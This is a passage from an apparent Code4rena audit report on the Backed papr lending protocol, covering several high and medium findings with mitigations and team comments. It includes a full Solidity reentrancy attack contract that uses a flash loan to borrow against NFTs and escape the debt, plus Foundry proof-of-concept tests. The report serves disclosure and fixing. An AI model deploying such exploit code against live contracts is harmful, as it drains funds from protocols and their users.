`3*oraclePrice` (because the `auctionStartPriceMultiplier = 3`), so it will be almost 3 \\* 50k = 150k.\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L326>\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L341>\n\n*   BobContract calls the function `purchaseLiquidationAuctionNFT` to buy it's own NFT with id 10 which is priced at almost 150k.\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264>\n\n*   In this function, we have the followoing variables:\n    *   ` collateralValueCached  ` = 150k \\* 0 = 0\n    *   ` isLastCollateral  ` = TRUE\n    *   ` debtCached  ` = 250k (same as before)\n    *   ` maxDebtCached  ` = 250k\n    *   ` neededToSaveVault  ` = 0\n    *   ` price  ` = 150k Please note that the functions `_purchaseNFTAndUpdateVaultIfNeeded` and `_purchaseNFT` are called that takes 150k from BobContract and transfers that last NFT with id 10 to BobContract.\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L519>\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/NFTEDA/NFTEDA.sol#L72>\n\n*   ` excess  ` = 150k Since it is larger than zero, the function `_handleExcess` is called.\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L532>\n\n*   ` fee  ` = 15k Considering 10% fee on the excess\n*   `credit` = 135k\n*   ` totalOwed  ` = 135k Since this is smaller than `debtCaches` 250k, the function `_reduceDebt` is called to reduce debt from 250k to 115k.\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L549>\n\n*   `remaining` = 115k\n*   All the above calculations mean that the last NFT is sold at 150k, and 15k is considered as fee, so 135k will be deducted from the debt. Since the debt was 250k, 115k remains as debt.\n*   In the last part of the function `purchaseLiquidationAuctionNFT`, there is a check that makes the debt of BobContract equal to zero. This is the place that BobContract takes profit. It means that the debt of 115k is ignored.\n\n<!---->\n\n    if (isLastCollateral && remaining != 0) {\n                /// there will be debt left with no NFTs, set it to 0\n                _reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining);\n            }\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L290>\n\n*   Now, the control returns back to the contract `PaprController`. So, it compares the debt and max for each collateral removal. Since the debt is set to zero in the previous steps, this check for all 10 NFTs will be passed.\n\n<!---->\n\n    if (debt > max) {\n                revert IPaprController.ExceedsMaxDebt(debt, max);\n            }\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L449>\n\n*   Now that the attack is finished, BobContract repays the flash loan after selling those 10 NFTs.\n*   ***Bob had 250k that borrowed at first, then he paid 150k to buy his own NFT with id 10 on the auction, so Bob's profit is equal to 100k. In summary, he could borrow 250k but only repaid 150k and received all his collateral.***\n*   Please note that taking a flash loan is not necessary, it is just to show that it can increase the attack impact much more.\n*   Please note that if Bob applies the same attack with only 3 NFTs (each worth 50k) and borrows 75k, he does not take any profit. Because, the last NFT should be bought 3 times the oracle price (3\\*50k = 150k) while the total debt was 75k.\n*   ***In order to take profit and steal funds, the attacker at least should add 7 NFTs as collateral and borrow the max debt. Because `numberOfNFT * oraclePrice * 50% > oraclePrice * 3`***\n\nIn the following PoC, I am showing how the attack can be applied.\n\nBob deploys the following contract and calls the function `attack()`. It takes flash loan from AAVE, then the callback from the AAVE will execute `executeOperation`. In this function, 10 NFTs with ids 1 to 10 are bought and added as collateral to the protocol.\n\nThen, it borrows max debt which is almost 250k, and remove the NFT with id 1.\n\nIn the callback of `safeTransferFrom`, the function `onERC721Received` is called, if the number of callback is less than 9, it repeats removal of the NFTs with ids 2 to 9, respectively.\n\nWhen NFTs with id 9 is removed, the function `startLiquidationAuction` is called to auction NFT with id 10. Then, this NFT is purchased by BobContract immediately at the start price (which is defined by protocol to be 3 times larger than the oracle price). Then, after the control is returned to the protocol, BobContract sells these 10 NFTs and repays the flash loan.\n\n```\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.0;\n\ninterface ERC721 {}\n\ninterface ERC20 {}\n\nstruct Collateral {\n    ERC721 addr;\n    uint256 id;\n}\nstruct OracleInfo {\n    Message message;\n    Sig sig;\n}\nstruct Message {\n    bytes32 id;\n    bytes payload;\n    uint256 timestamp;\n    bytes signature;\n}\nstruct Sig {\n    uint8 v;\n    bytes32 r;\n    bytes32 s;\n}\nstruct Auction {\n    address nftOwner;\n    uint256 auctionAssetID;\n    ERC721 auctionAssetContract;\n    uint256 perPeriodDecayPercentWad;\n    uint256 secondsInPeriod;\n    uint256 startPrice;\n    ERC20 paymentAsset;\n}\n\nenum PriceKind {\n    SPOT,\n    TWAP,\n    LOWER,\n    UPPER\n}\n\ninterface IPaprController {\n    function addCollateral(Collateral[] calldata collateral) external;\n\n    function increaseDebt(\n        address mintTo,\n        ERC721 asset,\n        uint256 amount,\n        OracleInfo calldata oracleInfo\n    ) external;\n\n    function removeCollateral(\n        address sendTo,\n        Collateral[] calldata collateralArr,\n        OracleInfo calldata oracleInfo\n    ) external;\n\n    function startLiquidationAuction(\n        address account,\n        Collateral calldata collateral,\n        OracleInfo calldata oracleInfo\n    ) external returns (Auction memory auction);\n\n    function purchaseLiquidationAuctionNFT(\n        Auction calldata auction,\n        uint256 maxPrice,\n        address sendTo,\n        OracleInfo calldata oracleInfo\n    ) external;\n\n    function maxDebt(uint256 totalCollateraValue)\n        external\n        view\n        returns (uint256);\n\n    function underwritePriceForCollateral(\n        ERC721 asset,\n        PriceKind priceKind,\n        OracleInfo memory oracleInfo\n    ) external returns (uint256);\n}\n\ninterface IFundingRateController {\n    function updateTarget() external returns (uint256);\n}\n\ninterface IAAVE {\n    function flashLoanSimple(\n        address receiverAddress,\n        address asset,\n        uint256 amount,\n        bytes calldata params,\n        uint16 referralCode\n    ) external;\n}\n\ncontract BobContract {\n    IPaprController iPaprController;\n    IFundingRateController iFundingRateController;\n    IAAVE iAAVE;\n    ERC721 nftCollectionAddress;\n    ERC20 paprToken;\n    Collateral[] collaterals;\n    OracleInfo oracleInfo;\n    uint256 numOfCallback;\n    address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n\n    constructor(\n        address _paprControllerAddress,\n        address _fundingRateControllerAddress,\n        address _aaveAddress,\n        ERC721 _nftCollectionAddress,\n        OracleInfo memory _oracleInfo,\n        ERC20 _paprToken\n    ) {\n        iPaprController = IPaprController(_paprControllerAddress);\n        iFundingRateController = IFundingRateController(\n            _fundingRateControllerAddress\n        );\n        iAAVE = IAAVE(_aaveAddress);\n        nftCollectionAddress = _nftCollectionAddress;\n        oracleInfo = _oracleInfo;\n        paprToken = _paprToken;\n    }\n\n    function attack() public {\n        ///// STEP1: taking flash loan\n        iAAVE.flashLoanSimple(address(this), USDC, 10 * 50000 * 10**6, \"\", 0);\n    }\n\n    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) external returns (bool) {\n        ///// STEP2: buying 10 NFTs\n\n        // Buy 10 NFTs that each worths almost 50k\n        // Assume the ids are from 1 to 10\n\n        ///// STEP3: adding the NFTs as collateral\n        for (uint256 i = 0; i < 10; ++i) {\n            collaterals.push(Collateral({addr: nftCollectionAddress, id: i}));\n        }\n        iPaprController.addCollateral(collaterals);\n\n        ///// STEP4: borrowing as much as possible\n        uint256 oraclePrice = iPaprController.underwritePriceForCollateral(\n            nftCollectionAddress,\n            PriceKind.LOWER,\n            oracleInfo\n        );\n\n        uint256 maxDebt = iPaprController.maxDebt(10 * oraclePrice);\n\n        iPaprController.increaseDebt(\n            address(this),\n            nftCollectionAddress,\n            maxDebt,\n            oracleInfo\n        );\n\n        ///// STEP5: removing the NFT with id 1\n        Collateral[] memory collateralArr = new Collateral[](1);\n        collateralArr[0] = Collateral({addr: nftCollectionAddress, id: 1});\n        iPaprController.removeCollateral(\n            address(this),\n            collateralArr,\n            oracleInfo\n        );\n\n        ///// STEP16: selling 10 NFTs and repaying the flash loan\n\n        // Selling the 10 NFTs\n        // Repaying the flash loan\n    }\n\n    function onERC721Received(\n        address from,\n        address,\n        uint256 _id,\n        bytes calldata data\n    ) external returns (bytes4) {\n        numOfCallback++;\n        if (numOfCallback < 9) {\n            ///// STEP6 - STEP13: removing the NFTs with id 2 to 9\n            Collateral[] memory collateralArr = new Collateral[](1);\n            collateralArr[0] = Collateral({\n                addr: nftCollectionAddress,\n                id: _id + 1\n            });\n            iPaprController.removeCollateral(\n                address(this),\n                collateralArr,\n                oracleInfo\n            );\n        } else {\n            ///// STEP14: starting the auction for NFT with id 10\n            Collateral memory lastCollateral = Collateral({\n                addr: nftCollectionAddress,\n                id: _id + 1\n            });\n            iPaprController.startLiquidationAuction(\n                address(this),\n                lastCollateral,\n                oracleInfo\n            );\n\n            ///// STEP15: buying the NFT with id 10 on the auction\n            uint256 oraclePrice = iPaprController.underwritePriceForCollateral(\n                nftCollectionAddress,\n                PriceKind.LOWER,\n                oracleInfo\n            );\n            uint256 startPrice = (oraclePrice * 3 * 1e18) /\n                iFundingRateController.updateTarget();\n\n            Auction memory auction = Auction({\n                nftOwner: address(this),\n                auctionAssetID: 10,\n                auctionAssetContract: nftCollectionAddress,\n                perPeriodDecayPercentWad: 0.7e18,\n                secondsInPeriod: 1 days,\n                startPrice: startPrice,\n                paymentAsset: paprToken\n            });\n\n            iPaprController.purchaseLiquidationAuctionNFT(\n                auction,\n                startPrice,\n                address(this),\n                oracleInfo\n            );\n        }\n    }\n}\n\n```\n\n### Recommended Mitigation Steps\n\nAdding a reentrancy guard to the involved functions can be a solution.\n\n**[wilsoncusack (Backed) confirmed and commented](https://github.com/code-423n4/2022-12-backed-findings/issues/102#issuecomment-1370990330):**\n > There is actually a simpler attack here: add one NFT and borrow max debt. Start Liquidation auction and purchase. On purchase reenter via safeTransferFrom and add many more NFTs, borrowing max. Purchase thinks this is the borrowers last NFT and debt is set to 0. Now borrower can withdraw all other NFTs for free.\n >\n >\n > We could:\n> - change removeCollateral to have the debt check BEFORE we send the NFT out, which would prevent sell to repay flows \n> - add a reentrancy guard on startAuction so that it can't be composed with others. \n> - add a reentrancy guard on purchase so that it can't be composed with others \n\n***\n\n## [[H-03] Collateral NFT deposited to a wrong address, when transferred directly to `PaprController`](https://github.com/code-423n4/2022-12-backed-findings/issues/183)\n*Submitted by [Jeiwan](https://github.com/code-423n4/2022-12-backed-findings/issues/183), also found by [Koolex](https://github.com/code-423n4/2022-12-backed-findings/issues/271), [Ruhum](https://github.com/code-423n4/2022-12-backed-findings/issues/153), and [rotcivegaf](https://github.com/code-423n4/2022-12-backed-findings/issues/121)*\n\nUsers will lose collateral NFTs when they are transferred to `PaprController` by an approved address or an operator.\n\n### Proof of Concept\n\nThe `PaprController` allows users to deposit NFTs as collateral to borrow Papr tokens. One way of depositing is by transferring an NFT to the contract directly via a call to `safeTransferFrom`: the contract implements the `onERC721Received` hook that will handle accounting of the transferred NFT ([PaprController.sol#L159](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L159)). However, the hook implementation uses a wrong argument to identify token owner: the first argument, which is used by the contract to identify token owner, is the address of the `safeTransferFrom` function caller, which may be an approved address or an operator. The actual owner address is the second argument ([ERC721.sol#L436](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L436)):\n\n```solidity\ntry IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, data) returns (bytes4 retval) {\n```\n\nThus, when an NFT is sent by an approved address or an operator, it'll be deposited to the vault of the approved address or operator:\n\n```solidity\n// test/paprController/OnERC721ReceivedTest.sol\n\nfunction testSafeTransferByOperator_AUDIT() public {\n    address operator = address(0x12345);\n\n    vm.prank(borrower);\n    nft.setApprovalForAll(operator, true);\n\n    vm.prank(operator);\n    nft.safeTransferFrom(borrower, address(controller), collateralId, abi.encode(safeTransferReceivedArgs));\n\n    // NFT was deposited to the operator's vault.\n    IPaprController.VaultInfo memory vaultInfo = controller.vaultInfo(operator, collateral.addr);\n    assertEq(vaultInfo.count, 1);\n\n    // Borrower has 0 tokens in collateral.\n    vaultInfo = controller.vaultInfo(borrower, collateral.addr);\n    assertEq(vaultInfo.count, 0);\n}\n\nfunction testSafeTransferByApproved_AUDIT() public {\n    address approved = address(0x12345);\n\n    vm.prank(borrower);\n    nft.approve(approved, collateralId);\n\n    vm.prank(approved);\n    nft.safeTransferFrom(borrower, address(controller), collateralId, abi.encode(safeTransferReceivedArgs));\n\n    // NFT was deposited to the approved address's vault.\n    IPaprController.VaultInfo memory vaultInfo = controller.vaultInfo(approved, collateral.addr);\n    assertEq(vaultInfo.count, 1);\n\n    // Borrower has 0 tokens in collateral.\n    vaultInfo = controller.vaultInfo(borrower, collateral.addr);\n    assertEq(vaultInfo.count, 0);\n}\n```\n\n### Recommended Mitigation Steps\n\nConsider this change:\n\n```diff\n--- a/src/PaprController.sol\n+++ b/src/PaprController.sol\n@@ -156,7 +156,7 @@ contract PaprController is\n     /// @param _id the id of the NFT\n     /// @param data encoded IPaprController.OnERC721ReceivedArgs\n     /// @return selector indicating succesful receiving of the NFT\n-    function onERC721Received(address from, address, uint256 _id, bytes calldata data)\n+    function onERC721Received(address, address from, uint256 _id, bytes calldata data)\n         external\n         override\n         returns (bytes4)\n```\n\n**[wilsoncusack (Backed) confirmed](https://github.com/code-423n4/2022-12-backed-findings/issues/183)**\n\n***\n\n## [[H-04] Users may be liquidated right after taking maximal debt](https://github.com/code-423n4/2022-12-backed-findings/issues/190)\n*Submitted by [Jeiwan](https://github.com/code-423n4/2022-12-backed-findings/issues/190)*\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L471>\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L317>\n\n### Impact\n\nSince there's no gap between the maximal LTV and the liquidation LTV, user positions may be liquidated as soon as maximal debt is taken, without leaving room for collateral and Papr token prices fluctuations. Users have no chance to add more collateral or reduce debt before being liquidated. This may eventually create more uncovered and bad debt for the protocol.\n\n### Proof of Concept\n\nThe protocol allows users to take debt up to the maximal debt, including it ([PaprController.sol#L471](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L471)):\n\n```solidity\nif (newDebt > max) revert IPaprController.ExceedsMaxDebt(newDebt, max);\n```\n\nHowever, a position becomes liquidable as soon as user's debt reaches user's maximal debt ([PaprController.sol#L317](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L317)):\n\n```solidity\nif (info.debt < _maxDebt(oraclePrice * info.count, cachedTarget)) {\n    revert IPaprController.NotLiquidatable();\n}\n```\n\nMoreover, the same maximal debt calculation is used during borrowing and liquidating, with the same maximal LTV ([PaprController.sol#L556-L559](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L556-L559)):\n\n```solidity\nfunction _maxDebt(uint256 totalCollateraValue, uint256 cachedTarget) internal view returns (uint256) {\n    uint256 maxLoanUnderlying = totalCollateraValue * maxLTV;\n    return maxLoanUnderlying / cachedTarget;\n}\n```\n\nEven though different price kinds are used during borrowing and liquidations ([LOWER during borrowing](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L467), [TWAP during liquidations](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L316)), the price can in fact match ([ReservoirOracleUnderwriter.sol#L11](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/ReservoirOracleUnderwriter.sol#L11)):\n\n```solidity\n/// @dev LOWER is the minimum of SPOT and TWAP\n```\n\nWhich means that the difference in prices doesn't always create a gap in maximal and liquidation LTVs.\n\nThe combination of these factors allows users to take maximal debts and be liquidated immediately, in the same block. Since liquidations are not beneficial for lending protocols, such heavy penalizing of users may harm the protocol and increase total uncovered debt, and potentially lead to a high bad debt.\n\n```solidity\n// test/paprController/IncreaseDebt.t.sol\n\nevent RemoveCollateral(address indexed account, ERC721 indexed collateralAddress, uint256 indexed tokenId);\n\nfunction testIncreaseDebtAndBeLiquidated_AUDIT() public {\n    vm.startPrank(borrower);\n    nft.approve(address(controller), collateralId);\n    IPaprController.Collateral[] memory c = new IPaprController.Collateral[](1);\n    c[0] = collateral;\n    controller.addCollateral(c);\n\n    // Calculating the max debt for the borrower.\n    uint256 maxDebt = controller.maxDebt(1 * oraclePrice);\n\n    // Taking the maximal debt.\n    vm.expectEmit(true, true, false, true);\n    emit IncreaseDebt(borrower, collateral.addr, maxDebt);\n    controller.increaseDebt(borrower, collateral.addr, maxDebt, oracleInfo);\n    vm.stopPrank();\n\n    // Making a TWAP price that's identical to the LOWER one.\n    priceKind = ReservoirOracleUnderwriter.PriceKind.TWAP;\n    ReservoirOracleUnderwriter.OracleInfo memory twapOracleInfo = _getOracleInfoForCollateral(nft, underlying);\n\n    // The borrower is liquidated in the same block.\n    vm.expectEmit(true, true, false, false);\n    emit RemoveCollateral(borrower, collateral.addr, collateral.id);\n    controller.startLiquidationAuction(borrower, collateral, twapOracleInfo);\n}\n```\n\n### Recommended Mitigation Steps\n\nConsider adding a liquidation LTV that's bigger than the maximal borrow LTV; positions can only be liquidated after reaching the liquidation LTV. This will create a room for price fluctuations and let users increase their collateral or decrease debt before being liquidating.\n\nAlternatively, consider liquidating positions only after their debt has increased the maximal one:\n\n```diff\n--- a/src/PaprController.sol\n+++ b/src/PaprController.sol\n@@ -314,7 +314,7 @@ contract PaprController is\n\n         uint256 oraclePrice =\n             underwritePriceForCollateral(collateral.addr, ReservoirOracleUnderwriter.PriceKind.TWAP, oracleInfo);\n-        if (info.debt < _maxDebt(oraclePrice * info.count, cachedTarget)) {\n+        if (info.debt <= _maxDebt(oraclePrice * info.count, cachedTarget)) {\n             revert IPaprController.NotLiquidatable();\n         }\n\n```\n**[wilsoncusack (Backed) disagreed with severity and commented](https://github.com/code-423n4/2022-12-backed-findings/issues/190#issuecomment-1369912705):**\n > I agree we should change this to a `<` [PaprController.sol#L471](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L471). But I do not see this as High severity, I don't think.\n> \n> Even with that changed, it is possible to be liquidated in the same block due to Target changing or a new oracle price. I think this is the norm for other lending protocols, e.g. I believe with Compound or Maker you could be liquidated in the same block if you max borrow and the oracle price is updated in the same block?\n\n**[Jeiwan (warden) commented](https://github.com/code-423n4/2022-12-backed-findings/issues/190#issuecomment-1370385098):**\n> Other lending protocols, like Compound, Maker, and Aave, have different LTV thresholds. For example, [AAVE](https://app.aave.com/reserve-overview/?underlyingAsset=0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2&marketName=proto_mainnet)\n> \n> Max LTV is the maximal debt and Liquidation threshold is the liquidation LTV. Users may borrow until max LTV but they're liquidated only after reaching the liquidation LTV. In the case of ETH, max LTV on AAVE is 82.50% and Liquidation threshold is 86.00%. The difference allows price and collateral value fluctuations, and it depends on the risk profile of an asset. For example, it's 13% for [LINK](https://app.aave.com/reserve-overview/?underlyingAsset=0x514910771af9ca656af840dff83e8264ecf986ca&marketName=proto_mainnet)\n>\n> This difference protects users from liquidations caused by high volatility.\n> \n> This is a high finding because users lose funds during liquidations and every liquidation may create bad debt for the protocol. Liquidations are harmful for both protocols and users, so lending protocols shouldn't allow users to borrow themselves right into liquidations.\n\n**[wilsoncusack (Backed) commented](https://github.com/code-423n4/2022-12-backed-findings/issues/190#issuecomment-1370387712):**\n > Thanks! TIL. My main reference was squeeth and there you can borrow right up to max (unless I miss something, again). Will consider making this change! \n\n**[trust1995 (judge) commented](https://github.com/code-423n4/2022-12-backed-findings/issues/190#issuecomment-1370836207):**\n > Because warden has demonstrated there is potentially no gap between liquidation LTV and borrow LTV, will treat this as HIGH impact. If the gap was even 1 wei I believe it would be a MEDIUM find, but the current code incentivizes MEV bots liquidating max debt positions in the same block.\n\n\n***\n\n \n# Medium Risk Findings (8)\n## [[M-01] Missing deadline checks allow pending transactions to be maliciously executed](https://github.com/code-423n4/2022-12-backed-findings/issues/64)\n*Submitted by [Bobface](https://github.com/code-423n4/2022-12-backed-findings/issues/64)*\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L208>\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L182>\n\n### Summary\n\nThe `PaprController` contract does not allow users to submit a deadline for their actions which execute swaps on Uniswap V3. This missing feature enables pending transactions to be maliciously executed at a later point.\n\n### Detailed description\n\nAMMs provide their users with an option to limit the execution of their pending actions, such as swaps or adding and removing liquidity. The most common solution is to include a deadline timestamp as a parameter (for example see [Uniswap V2](https://github.com/Uniswap/v2-periphery/blob/0335e8f7e1bd1e8d8329fd300aea2ef2f36dd19f/contracts/UniswapV2Router02.sol#L229) and [Uniswap V3](https://github.com/Uniswap/v3-periphery/blob/6cce88e63e176af1ddb6cc56e029110289622317/contracts/SwapRouter.sol#L119)). If such an option is not present, users can unknowingly perform bad trades:\n\n1.  Alice wants to swap 100 `tokens` for 1 `ETH` and later sell the 1 `ETH` for 1000 `DAI`.\n2.  The transaction is submitted to the mempool, however, Alice chose a transaction fee that is too low for miners to be interested in including her transaction in a block. The transaction stays pending in the mempool for extended periods, which could be hours, days, weeks, or even longer.\n3.  When the average gas fee dropped far enough for Alice's transaction to become interesting again for miners to include it, her swap will be executed. In the meantime, the price of `ETH` could have drastically changed. She will still get 1 `ETH` but the `DAI` value of that output might be significantly lower. She has unknowingly performed a bad trade due to the pending transaction she forgot about.\n\nAn even worse way this issue can be maliciously exploited is through MEV:\n\n1.  The swap transaction is still pending in the mempool. Average fees are still too high for miners to be interested in it. The price of `tokens` has gone up significantly since the transaction was signed, meaning Alice would receive a lot more `ETH` when the swap is executed. But that also means that her maximum slippage value (`sqrtPriceLimitX96` and `minOut` in terms of the Papr contracts) is outdated and would allow for significant slippage.\n2.  A MEV bot detects the pending transaction. Since the outdated maximum slippage value now allows for high slippage, the bot sandwiches Alice, resulting in significant profit for the bot and significant loss for Alice.\n\nSince Papr directly builds on Uniswap V3, such deadline parameters should also be offered to the Papr users when transactions involve performing swaps. However, there is no deadline parameter available. Some functions, such as `_increaseDebtAndSell`, are to some degree protected due to the oracle signatures becoming outdated after 20 minutes, though even that could be too long for certain trades. Other functions, such as `buyAndReduceDebt`, are entirely unprotected.\n\n### Recommended Mitigation Steps\n\nIntroduce a `deadline` parameter to all functions which potentially perform a swap on the user's behalf.\n\n### Impact\n\nCategorizing this issue into Medium versus High was not immediately obvious. I came to the conclusion that this is a high-severity issue for the following reason:\n\nI run an arbitrage MEV bot myself, which also tracks pending transactions in the mempool, though for another reason than the one mentioned in this report. There is a *significant* amount of pending and even dropped transactions: over `200,000` transactions that are older than one month. These transactions do all kinds of things, from withdrawing from staking contracts to sending funds to CEXs and also performing swaps on DEXs like Uniswap. This goes to show that this issue will in fact be very real, there will be very old pending transactions wanting to perform trades without a doubt. And with the prevalence of advanced MEV bots, these transactions will be exploited as described in the second example above, leading to losses for Papr's users.\n\n### Proof of Concept\n\nOmitted in this case, since the exploit is solely based on the fact that there is no limit on how long a transaction including a swap is allowed to be pending, which can be clearly seen when looking at the mentioned functions.\n\n**[Jeiwan (warden) commented](https://github.com/code-423n4/2022-12-backed-findings/issues/64#issuecomment-1369843140):**\n > A slippage check is in place, so users are protected from losing funds during swapping:\n> https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/libraries/UniswapHelpers.sol#L58-L60\n> \n> The only viable attack scenario seems to be stealing of positive slippage by MEV bots. However, a deadline may not protect from this as well, since a spike in price may happen before a deadline. A too short deadline may also cause undesired reverts during gas price volatility. All in all it seems like users will likely cancel or re-submit their transactions instead of waiting for pending ones.\n\n**[wilsoncusack (Backed) disagreed with severity and commented](https://github.com/code-423n4/2022-12-backed-findings/issues/64#issuecomment-1370078615):**\n > Was going to say what @Jeiwan said. Think it should be Medium or Low.\n\n**[trust1995 (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-12-backed-findings/issues/64#issuecomment-1370861874):**\n > On the fence between Low and Medium. I tend to view \"stealing of positive slippage\" as meaningful enough to warrant Medium severity.\n\n\n***\n\n## [[M-02] Disabled NFT collateral should not be used to mint debt](https://github.com/code-423n4/2022-12-backed-findings/issues/91)\n*Submitted by [ladboy233](https://github.com/code-423n4/2022-12-backed-findings/issues/91), also found by [unforgiven](https://github.com/code-423n4/2022-12-backed-findings/issues/233), [bin2chen](https://github.com/code-423n4/2022-12-backed-findings/issues/223), [8olidity](https://github.com/code-423n4/2022-12-backed-findings/issues/175), and [\\_\\_141345\\_\\_](https://github.com/code-423n4/2022-12-backed-findings/issues/165)*\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L365>\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L138>\n\n### Impact\n\nDisabled collateral can still be used to mint debt.\n\n### Proof of Concept\n\nThere is an access control function in PaprController.sol:\n\n```solidity\n/// @inheritdoc IPaprController\nfunction setAllowedCollateral(IPaprController.CollateralAllowedConfig[] calldata collateralConfigs)\n\texternal\n\toverride\n\tonlyOwner\n{\n```\n\nAccording to IPaprController, if the collateral is disabled, set to false, the user should not be allowed to mint debt using the collateral:\n\n```solidity\n/// @notice sets whether a collateral is allowed to be used to mint debt\n/// @dev owner function\n/// @param collateralConfigs configuration settings indicating whether a collateral is allowed or not\nfunction setAllowedCollateral(IPaprController.CollateralAllowedConfig[] calldata collateralConfigs) external;\n```\n\nHowever, the code only checks if the collateral is allowed when adding collateral:\n\n```solidity\nfunction _addCollateralToVault(address account, IPaprController.Collateral memory collateral) internal {\n\tif (!isAllowed[address(collateral.addr)]) {\n\t\trevert IPaprController.InvalidCollateral();\n\t}\n```\n\nBut does not have the same check when minting debt, then user can use disabled collateral to mint debt:\n\n```solidity\nfunction _increaseDebt(\n\taddress account,\n\tERC721 asset,\n\taddress mintTo,\n\tuint256 amount,\n\tReservoirOracleUnderwriter.OracleInfo memory oracleInfo\n) internal {\n\tuint256 cachedTarget = updateTarget();\n\n\tuint256 newDebt = _vaultInfo[account][asset].debt + amount;\n\tuint256 oraclePrice =\n\t\tunderwritePriceForCollateral(asset, ReservoirOracleUnderwriter.PriceKind.LOWER, oracleInfo);\n\n\tuint256 max = _maxDebt(_vaultInfo[account][asset].count * oraclePrice, cachedTarget);\n\n\tif (newDebt > max) revert IPaprController.ExceedsMaxDebt(newDebt, max);\n\n\tif (newDebt >= 1 << 200) revert IPaprController.DebtAmountExceedsUint200();\n\n\t_vaultInfo[account][asset].debt = uint200(newDebt);\n\tPaprToken(address(papr)).mint(mintTo, amount);\n\n\temit IncreaseDebt(account, asset, amount);\n}\n```\n\nAs shown in the coded POC, we can add the following test to increaseDebt.t.sol:\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/test/paprController/IncreaseDebt.t.sol#L32>\n\n```solidity\nfunction testIncreaseDebt_POC() public {\n\n\tuint256 debt = 10 ether;\n\t// console.log(debt);\n\n\tvm.assume(debt < type(uint200).max);\n\tvm.assume(debt < type(uint256).max / controller.maxLTV() / 2);\n\n\toraclePrice = debt * 2;\n\toracleInfo = _getOracleInfoForCollateral(nft, underlying);\n\n\n\tvm.startPrank(borrower);\n\tnft.approve(address(controller), collateralId);\n\tIPaprController.Collateral[] memory c = new IPaprController.Collateral[](1);\n\tc[0] = collateral;\n\n\tcontroller.addCollateral(c);\n\n\t// disable the collateral but still able to mint debt\n\tIPaprController.CollateralAllowedConfig[] memory args = new IPaprController.CollateralAllowedConfig[](1);\n\targs[0] = IPaprController.CollateralAllowedConfig({\n\t\tcollateral: address(collateral.addr),\n\t\tallowed: false\n\t});\n\n\tvm.stopPrank();\n\n\tvm.prank(controller.owner());\n\tcontroller.setAllowedCollateral(args);\n\n\tvm.startPrank(borrower);\n\n\tcontroller.increaseDebt(borrower, collateral.addr, debt, oracleInfo);\n\tassertEq(debtToken.balanceOf(borrower), debt);\n\tassertEq(debt, controller.vaultInfo(borrower, collateral.addr).debt);\n}\n```\n\nWe disable the collateral but still are able to mint debt by calling increaseDebt.\n\nWe run the test:\n\n```solidity\nforge test -vvv --match testIncreaseDebt_POC\n```\n\nThe test passes, but the test should revert.\n\n    Running 1 test for test/paprController/IncreaseDebt.t.sol:IncreaseDebtTest\n    [PASS] testIncreaseDebt_POC() (gas: 239301)\n    Test result: ok. 1 passed; 0 failed; finished in 237.42ms\n\n### Recommended Mitigation Steps\n\nWe recommend the project add checks to make sure when the collateral is disabled, the collateral should not be used to mint debt.\n\n```solidity\nif (!isAllowed[address(collateral.addr)]) {\n\trevert IPaprController.InvalidCollateral();\n}\n```\n\n**[wilsoncusack (Backed) confirmed and commented](https://github.com/code-423n4/2022-12-backed-findings/issues/91#issuecomment-1370102552):**\n > Hmm, yeah this was known but the warden 